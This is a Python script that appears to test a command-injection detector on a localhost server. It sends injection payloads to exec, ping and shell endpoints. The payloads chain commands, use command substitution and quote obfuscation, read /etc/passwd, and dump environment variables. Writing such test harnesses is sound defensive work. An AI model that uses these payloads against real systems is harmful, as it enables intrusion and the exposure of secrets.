#!/usr/bin/env python3
"""
Command Injection Testing Script
Tests various command injection vulnerabilities

WARNING: Use only in authorized testing environments!
"""

import requests
import json
import sys

TARGET_URL = "http://localhost:3000"

def test_command_injection():
    """Test /api/exec endpoint with various command injection payloads"""
    print("="*60)
    print("🔴 COMMAND INJECTION TESTS")
    print("="*60)

    payloads = [
        # Basic commands
        {"name": "Basic whoami", "command": "whoami"},
        {"name": "List files", "command": "ls -la"},
        {"name": "Print working directory", "command": "pwd"},

        # Command chaining
        {"name": "Command chaining (semicolon)", "command": "whoami; id"},
        {"name": "Command chaining (AND)", "command": "whoami && id"},
        {"name": "Command chaining (OR)", "command": "whoami || id"},

        # Command substitution
        {"name": "Command substitution $(...)", "command": "echo $(whoami)"},
        {"name": "Command substitution backticks", "command": "echo `whoami`"},

        # Pipe commands
        {"name": "Pipe to grep", "command": "cat /etc/passwd | grep root"},

        # File access
        {"name": "Read /etc/passwd", "command": "cat /etc/passwd"},
        {"name": "Read /etc/hosts", "command": "cat /etc/hosts"},

        # System information
        {"name": "System info", "command": "uname -a"},
        {"name": "Environment variables", "command": "env"},

        # Obfuscation techniques
        {"name": "Character insertion", "command": "w'h'o'a'm'i"},
        {"name": "Tab character", "command": "who\tami || whoami"},
    ]

    for payload in payloads:
        print(f"\n📤 Test: {payload['name']}")
        print(f"   Command: {payload['command']}")

        try:
            response = requests.post(
                f"{TARGET_URL}/api/exec",
                json={"command": payload['command']},
                timeout=10
            )

            data = response.json()
            if data.get('success'):
                print(f"   ✓ Executed successfully")
                output = data.get('output', '').strip()
                if output:
                    # Show first 100 chars of output
                    print(f"   Output: {output[:100]}{'...' if len(output) > 100 else ''}")
            else:
                print(f"   ✗ Failed: {data.get('error', 'Unknown error')}")

        except Exception as e:
            print(f"   ✗ Request error: {e}")

    print("\n" + "="*60)
    print("🛡️  EXPECTED DETECTIONS:")
    print("   • Shell metacharacters (; && || |)")
    print("   • Command substitution patterns")
    print("   • Suspicious commands (whoami, cat, etc.)")
    print("   • File access patterns (/etc/passwd)")
    print("="*60)


def test_ping_injection():
    """Test /api/ping endpoint with command injection"""
    print("\n" + "="*60)
    print("🔴 PING COMMAND INJECTION TESTS")
    print("="*60)

    payloads = [
        {"name": "Normal ping", "host": "127.0.0.1"},
        {"name": "Semicolon injection", "host": "127.0.0.1; whoami"},
        {"name": "AND injection", "host": "127.0.0.1 && cat /etc/passwd"},
        {"name": "OR injection", "host": "127.0.0.1 || id"},
        {"name": "Pipe injection", "host": "127.0.0.1 | ls -la"},
        {"name": "Backtick injection", "host": "127.0.0.1`whoami`"},
        {"name": "Command substitution", "host": "127.0.0.1$(whoami)"},
    ]

    for payload in payloads:
        print(f"\n📤 Test: {payload['name']}")
        print(f"   Host: {payload['host']}")

        try:
            response = requests.post(
                f"{TARGET_URL}/api/ping",
                json={"host": payload['host']},
                timeout=15
            )

            data = response.json()
            print(f"   Success: {data.get('success')}")
            if data.get('output'):
                print(f"   Output: {data['output'][:100]}...")

        except Exception as e:
            print(f"   ✗ Request error: {e}")

    print("\n" + "="*60)


def test_shell_spawn():
    """Test /api/shell endpoint"""
    print("\n" + "="*60)
    print("🔴 SHELL SPAWN INJECTION TESTS")
    print("="*60)

    payloads = [
        {"name": "Basic echo", "cmd": "echo", "args": "Hello World"},
        {"name": "Whoami via sh", "cmd": "sh", "args": "-c whoami"},
        {"name": "List files via sh", "cmd": "sh", "args": "-c 'ls -la'"},
        {"name": "Cat passwd", "cmd": "sh", "args": "-c 'cat /etc/passwd'"},
        {"name": "Node REPL", "cmd": "node", "args": "-e 'console.log(process.env)'"},
    ]

    for payload in payloads:
        print(f"\n📤 Test: {payload['name']}")
        print(f"   Command: {payload['cmd']}")
        print(f"   Args: {payload['args']}")

        try:
            response = requests.post(
                f"{TARGET_URL}/api/shell",
                json={"cmd": payload['cmd'], "args": [payload['args']]},
                timeout=10
            )

            data = response.json()
            print(f"   Success: {data.get('success')}")
            if data.get('output'):
                print(f"   Output: {data['output'][:150]}...")

        except Exception as e:
            print(f"   ✗ Request error: {e}")


if __name__ == "__main__":
    try:
        # Check server
        try:
            response = requests.get(f"{TARGET_URL}/api/health", timeout=5)
            print(f"✓ Server is running\n")
        except:
            print(f"✗ Server not reachable at {TARGET_URL}")
            sys.exit(1)

        # Run tests
        test_command_injection()
        test_ping_injection()
        test_shell_spawn()

        print("\n" + "="*60)
        print("✓ ALL TESTS COMPLETE")
        print("="*60)

    except KeyboardInterrupt:
        print("\n\n⚠️  Testing interrupted")
        sys.exit(0)
